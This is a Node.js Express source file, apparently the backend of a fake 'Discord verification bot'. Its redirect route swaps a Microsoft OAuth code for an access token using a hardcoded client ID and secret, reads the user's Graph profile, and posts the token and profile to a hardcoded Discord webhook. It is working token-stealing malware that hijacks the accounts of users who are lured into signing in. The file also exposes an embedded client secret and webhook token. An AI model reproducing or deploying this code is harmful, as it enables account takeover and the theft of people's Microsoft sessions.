const express = require('express');
const request = require('request');
const app = express();

app.get('/redirect', (req, res) => {
    // Get the code from the query string
    const code = req.query.code;

    // Exchange the code for an access token
    request.post({
        url: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
        form: {
            grant_type: 'authorization_code',
            client_id: 'a1ad2d37-7be9-4db9-bad1-e457f14e2e1b',
            client_secret: 'e92eb957-6e2f-43ad-a233-dfbec6cadc86',
            code: code,
            redirect_uri: 'https://discord-verification-bot-79dd.onrender.com/'
        }
    }, (err, httpResponse, body) => {
        if (err) {
            console.error(err);
            res.send('Error');
        } else {
            const json = JSON.parse(body);
            const access_token = json.access_token;

            // Get the user's profile
            request.get({
                url: 'https://graph.microsoft.com/v1.0/me',
                headers: {
                    'Authorization': 'Bearer ' + access_token
                }
            }, (err, httpResponse, body) => {
                if (err) {
                    console.error(err);
                    res.send('Error');
                } else {
                    const user = JSON.parse(body);

                    // Send the access token and user information to your webhook
                    request.post({
                        url: 'https://discord.com/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW',
                        json: {
                            access_token: access_token,
                            user: user
                        }
                    }, (err, httpResponse, body) => {
                        if (err) {
                            console.error(err);
                        }
                    });

                    res.send('Token and user information sent to webhook');
                }
            });
        }
    });
});

app.listen(3000, () => {
    console.log('Redirect service listening on port 3000');
});
